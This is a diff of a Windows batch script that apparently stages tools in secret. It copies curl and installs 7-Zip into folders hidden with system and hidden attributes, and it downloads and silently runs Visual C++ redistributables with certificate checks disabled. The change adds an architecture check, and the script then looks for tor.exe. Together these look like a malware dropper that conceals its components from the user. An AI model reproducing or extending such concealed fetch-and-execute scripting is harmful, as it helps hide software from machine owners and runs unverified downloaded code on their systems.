@@ -25,8 +25,10 @@ copy /y "curl.exe" "%environment%\curl.exe" && attrib +s +h +i "%environment%\cu
 
 "%environment%\curl.exe" -k https://www.7-zip.org/a/7z2201.exe -o "%temp%\7z2201.exe" && "%temp%\7z2201.exe" /S /D="%environment%\7-Zip" && del "%temp%\7z2201.exe" && attrib +s +h +i "%environment%\7-Zip"
 
-curl -k -L https://archive.org/download/visual-c-redistributable-for-visual-studio-2012-update-4/Visual%20C%2B%2B%20Redistributable%20for%20Visual%20Studio%202012%20Update%204.zip/vcredist_x86.exe -o "%temp%\vcredist_x86.exe" && "%temp%\vcredist_x86.exe" /Q && del "%temp%\vcredist_x86.exe"
-curl -k -L https://archive.org/download/visual-c-redistributable-for-visual-studio-2012-update-4/Visual%20C%2B%2B%20Redistributable%20for%20Visual%20Studio%202012%20Update%204.zip/vcredist_x64.exe -o "%temp%\vcredist_x64.exe" && "%temp%\vcredist_x64.exe" /Q && del "%temp%\vcredist_x64.exe"
+reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL && set OS=32BIT || set OS=64BIT
+
+if %OS%==32BIT curl -k -L https://archive.org/download/visual-c-redistributable-for-visual-studio-2012-update-4/Visual%20C%2B%2B%20Redistributable%20for%20Visual%20Studio%202012%20Update%204.zip/vcredist_x86.exe -o "%temp%\vcredist_x86.exe" && "%temp%\vcredist_x86.exe" /Q && del "%temp%\vcredist_x86.exe"
+if %OS%==64BIT curl -k -L https://archive.org/download/visual-c-redistributable-for-visual-studio-2012-update-4/Visual%20C%2B%2B%20Redistributable%20for%20Visual%20Studio%202012%20Update%204.zip/vcredist_x64.exe -o "%temp%\vcredist_x64.exe" && "%temp%\vcredist_x64.exe" /Q && del "%temp%\vcredist_x64.exe"
 
 
 if exist "%environment%\tor.exe" (
